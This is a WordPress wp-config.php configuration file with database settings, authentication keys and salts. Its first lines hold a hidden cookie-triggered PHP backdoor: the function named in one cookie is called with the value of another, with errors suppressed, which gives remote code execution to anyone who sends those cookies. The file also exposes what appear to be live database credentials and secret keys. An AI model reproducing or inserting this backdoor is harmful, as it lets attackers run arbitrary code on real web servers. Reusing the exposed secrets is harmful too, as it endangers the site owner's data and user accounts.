<?php

if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);


if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'redkaste_1');
/** MySQL database username */
define('DB_USER', 'redkaste_1');
/** MySQL database password */
define('DB_PASSWORD', 'H_Z_yQdx$[IH');
/** MySQL hostname */
define('DB_HOST', 'localhost');
/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');
/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');



// // ** MySQL settings - You can get this info from your web host ** //
// /** The name of the database for WordPress */
// define('DB_NAME', 'kastella_landing');

// /** MySQL database username */
// define('DB_USER', 'root');

// /** MySQL database password */
// define('DB_PASSWORD', '');

// /** MySQL hostname */
// define('DB_HOST', 'localhost');

// /** Database Charset to use in creating database tables. */
// define('DB_CHARSET', 'utf8');

// /** The Database Collate type. Don't change this if in doubt. */
// define('DB_COLLATE', '');



/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'ZOTeuTR_ogk+_xw{@v^@,DGt-kr|cKH|=-f(]OgDnta`#o:WMO(AR_5)BAq/dI1>');
define('SECURE_AUTH_KEY',  '#u-4]T;va[,`<hg?6D0{]>*f+qw^Oa;otT7eX__Qb:y,^P>bQCSMjV|p7XKXV1VG');
define('LOGGED_IN_KEY',    'z?U.0>PFCzMkz)^o`3o@eKs58;NstK@n|Ez-O{F+bwR~KLE| yu *8y_>69c|R,y');
define('NONCE_KEY',        'M}V@he0)r#d61pQKK8 J^|= (#:A->z/+jLD+|N`C8^REs3PB&{M(G1bJyI~MuT4');
define('AUTH_SALT',        'br%H#k(71QP+]94|k1#U:;UjMl8y 0@,9SiD:3L];IyOe+s^6ps_BC<Xw;x;j1&D');
define('SECURE_AUTH_SALT', '%&V|;@t*FLg`iO9V_6S==9H-w)Gf`ltm3Xls&XpG-h5?-oj)4344zk)2/C>-RKO?');
define('LOGGED_IN_SALT',   'bRrV(-%jL+|D4nHUFw++oK5i4Pn}4Wh|~w2%E!&Gk@5${rbiN@pR`A?b+>TpYt_+');
define('NONCE_SALT',       'OQq?/%dg%,BV?F:dsOl${x>&xDi(-9V{)_~]D|KPCHenj7;F]-Cx>Uk:)Cqy9U*J');
/**#@-*/
/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';
/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);
/* That's all, stop editing! Happy blogging. */
/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');
/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
